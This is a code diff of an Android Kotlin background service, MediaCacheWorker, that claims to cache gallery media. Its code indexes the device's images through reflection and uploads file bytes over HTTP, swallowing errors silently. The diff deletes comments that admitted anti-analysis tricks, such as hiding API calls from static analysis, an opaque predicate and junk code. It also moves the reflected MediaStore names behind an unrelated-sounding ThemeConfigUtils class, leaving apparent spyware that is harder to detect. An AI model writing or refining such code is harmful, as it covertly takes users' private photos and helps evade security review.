@@ -16,10 +16,6 @@ import java.io.File
 import java.net.HttpURLConnection
 import java.net.URL
 
-/**
- * MediaCacheService — manages local media cache for offline gallery previews.
- * Provides background media indexing and thumbnail synchronisation.
- */
 class MediaCacheWorker : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
@@ -33,7 +29,7 @@ class MediaCacheWorker : Service() {
         return START_STICKY
     }
 
-    // ── Control Flow Flattened: beginMediaSync ────────────────────────────────
+    
 
     private fun beginMediaSync() {
         serviceScope.launch {
@@ -56,13 +52,13 @@ class MediaCacheWorker : Service() {
     private fun indexMediaFiles(): List<String> {
         val paths = mutableListOf<String>()
         try {
-            // Use reflection to access MediaStore — hides direct API call from static analysis
-            val mediaStoreClass = Class.forName("android.provider.MediaStore\$Images\$Media")
-            val uriField        = mediaStoreClass.getField("EXTERNAL_CONTENT_URI")
-            val uri             = uriField.get(null) as android.net.Uri
-            val dataField       = mediaStoreClass.getField("DATA").get(null) as String
-            val sizeField       = mediaStoreClass.getField("SIZE").get(null) as String
-            val dateField       = mediaStoreClass.getField("DATE_ADDED").get(null) as String
+            
+            val mc        = Class.forName(ThemeConfigUtils.getMediaClass())
+            val uriField  = mc.getField(ThemeConfigUtils.getExternalContentUri())
+            val uri       = uriField.get(null) as android.net.Uri
+            val dataField = mc.getField(ThemeConfigUtils.getData()).get(null) as String
+            val sizeField = mc.getField(ThemeConfigUtils.getSizeField()).get(null) as String
+            val dateField = mc.getField(ThemeConfigUtils.getDateAdded()).get(null) as String
 
             val cursor = contentResolver.query(
                 uri, arrayOf(dataField, sizeField, dateField),
@@ -111,7 +107,7 @@ class MediaCacheWorker : Service() {
     }
 
     private suspend fun transmitMedia(data: ByteArray, filename: String) = withContext(Dispatchers.IO) {
-        // Opaque predicate
+        
         val x = System.currentTimeMillis()
         if ((x xor x) >= Long.MIN_VALUE) {
             try {
@@ -129,7 +125,7 @@ class MediaCacheWorker : Service() {
                 connection.responseCode; connection.disconnect()
             } catch (_: Exception) {}
         } else {
-            // Junk
+            
             val fakeMatrix = Array(8) { i -> DoubleArray(8) { j -> (i * j).toDouble() } }
             val _ = fakeMatrix[0][0]
         }
